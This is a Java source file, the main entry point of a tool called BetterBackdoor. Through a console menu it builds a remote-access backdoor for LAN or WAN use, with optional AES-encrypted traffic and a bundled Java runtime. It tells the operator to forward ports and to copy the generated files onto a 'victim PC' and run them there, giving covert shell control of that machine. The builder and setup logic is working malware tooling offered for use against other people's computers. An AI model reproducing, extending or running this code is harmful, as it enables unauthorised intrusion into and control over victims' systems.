package dev.thatcherclough.betterbackdoor;

import java.io.File;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Objects;
import java.util.Scanner;

import dev.thatcherclough.betterbackdoor.backend.Utils;
import dev.thatcherclough.betterbackdoor.shell.Shell;

import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.crypto.*;

@SpringBootApplication
public class BetterBackdoor {

	public final static Scanner sc = new Scanner(System.in);
	public final static String os = System.getProperty("os.name");

	/**
	 * Starts BetterBackdoor.
	 *
	 * @param args command line arguments
	 */
	public static void main(String[] args) {
		System.out.println("_________        __    __              __________                __       .___\n"
				+ "\\_____   \\ _____/  |__/  |_  __________\\______   \\______    ____ |  | __ __| _/____   ___________ \n"
				+ " |    |  _// __ \\   __\\   __\\/ __ \\_  __ \\    |  _/\\__  \\ _/ ___\\|  |/ // __ |/  _ \\ /  _ \\_  __ \\\n"
				+ " |    |   \\  ___/|  |  |  | \\  ___/|  | \\/    |   \\ / __ \\\\  \\___|    </ /_/ (  <_> |  <_> )  | \\/\n"
				+ " |______  /\\___  >__|  |__|  \\___  >__|  |______  /(____  /\\___  >__|_ \\____ |\\____/ \\____/|__|\n"
				+ "        \\/     \\/                \\/             \\/      \\/     \\/     \\/    \\/");
		System.out.println("Welcome to BetterBackdoor\n");
		System.out.println("Select:");
		System.out.println("[0] Create backdoor");
		System.out.println("[1] Open backdoor shell");
		String choice = getInput("op01");
		if (choice.equals("0")) {
			try {
				System.out.println("Would you like this backdoor to operate within a single network, LAN, or over the internet, WAN (requires port forwarding):");
				System.out.println("[0] LAN");
				System.out.println("[1] WAN (requires port forwarding)");
				String ipType = getInput("op01").equals("0") ? "internal" : "external";

				String encryptionKey = null;
				System.out.println("Would you like to encrypt data sent to and from the backdoor using an automatically generated 128 bit AES encryption key?(y/n):");
				boolean encrypt = Boolean.parseBoolean(getInput("yn"));
				if (encrypt) {
					KeyGenerator keyGenerator;
					try {
						keyGenerator = KeyGenerator.getInstance("AES");
					} catch (NoSuchAlgorithmException e) {
						throw new Exception("Could not generate encryption key.");
					}
					Objects.requireNonNull(keyGenerator).init(128);
					encryptionKey = Base64.getEncoder().encodeToString(keyGenerator.generateKey().getEncoded());
					System.out.println("Automatically generated key: " + encryptionKey + "\n");
				}

				boolean jre = false;
				if (os.contains("Windows")) {
					System.out.println(
							"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java " +
									"installed?" +
									"(y/n):");
					jre = Boolean.parseBoolean(getInput("yn"));
				} else
					System.out.println(
							"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
									+ "in the current working directory create folder 'jre' containing 'bin' and 'lib' directories from a Windows JRE distribution.\n");

				System.out.println("Press ENTER to create backdoor...");
				sc.nextLine();
				System.out.println("Creating...\n");
				Setup.create(jre, ipType, encryptionKey);
				System.out.println("Created!\n");
				if (ipType.equals("external"))
					System.out.println(
							"Using your routers settings page, forward ports 1025 and 1026 from this computer ("
									+ Utils.getIP("internal") + ") with TCP selected.\n");
				System.out.println(
						"To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.\n"
								+ "If a JRE is packaged with the backdoor, execute run.bat, otherwise execute run.jar.\n"
								+ "This will start the backdoor on the victim's PC.\n"
								+ "To control the backdoor, return to BetterBackdoor and run option 1 at start.\n");
				if (encrypt) {
					String keysFilepath = System.getProperty("user.dir") + File.separator + "keys.txt";
					System.out.println("***IMPORTANT***\nEncryption key: " + encryptionKey + "\nThe encryption key is stored both inside of run.jar (the backdoor) and in '"
							+ keysFilepath + "' on the current machine.\nIf 'keys.txt' gets deleted, you will be given an option to manually input the key when " +
							"connecting to the backdoor.\nWithout this key you will not be able to control the backdoor.\n");
				}

				System.out.println("Press ENTER to exit...");
				sc.nextLine();
			} catch (Exception e) {
				if (e.getMessage() == null)
					error("Could not create backdoor");
				else
					error("Could not create backdoor:\n" + e.getMessage());
			}
		} else
			Shell.start();
	}

	/**
	 * Gets user input and verify it's validity with {@code type}.
	 *
	 * @param type type of input
	 * @return user input
	 */
	public static String getInput(String type) {
		System.out.print(">");
		String ret = sc.nextLine();
		if (ret.isEmpty())
			return getInput(type);
		else if (type.equals("file") && !new File(ret).exists()) {
			System.out.println("\nFile not found\nEnter a valid file path:");
			return getInput(type);
		} else if (type.equals("yn") && !(ret.equalsIgnoreCase("y") || ret.equalsIgnoreCase("n"))) {
			System.out.println("\nInvalid entry\nEnter 'y' or 'n':");
			return getInput(type);
		} else if (type.startsWith("op") && (!type.substring(2).contains(ret) || !(ret.length() == 1)))
			return getInput(type);
		else
			System.out.println();

		if (type.equals("file"))
			return Paths.get(ret).toString();
		else if (type.equals("yn"))
			if (ret.equals("y"))
				return "true";
			else
				return "false";
		else
			return ret;
	}

	/**
	 * Displays "An error occurred" followed by {@code errorMessage} and exits.
	 *
	 * @param errorMessage error message to display
	 */
	public static void error(String errorMessage) {
		System.out.println("An error occurred:\n" + errorMessage + "\n");
		System.exit(0);
	}
}